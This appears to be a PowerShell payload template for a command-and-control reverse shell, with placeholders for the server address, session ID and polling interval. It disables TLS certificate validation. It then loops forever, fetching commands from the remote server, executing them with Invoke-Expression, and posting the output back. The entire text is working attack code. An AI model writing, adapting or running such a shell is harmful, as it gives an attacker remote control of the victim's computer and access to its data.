add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$ip='*SERVERIP*';$id='*SESSIONID*';$p='https://';
$v=Invoke-WebRequest -UseBasicParsing -Uri $p$ip/4db6390f840c -Headers @{"X-hoax-id"=$id};
do {
    $c=Invoke-WebRequest -UseBasicParsing -Uri $p$ip/c5233a465a7d -Headers @{"X-hoax-id"=$id};
    if ($c.Content -ne 'None') {
        $r=iex $c.Content -ErrorAction Stop -ErrorVariable e;
        $r=Out-String -InputObject $r;
        $t=Invoke-WebRequest -Uri $p$ip/7f47fd7ae404 -Method POST -Headers @{"X-hoax-id"=$id} -Body $r$e
    } sleep *FREQ*;
} while ($true)
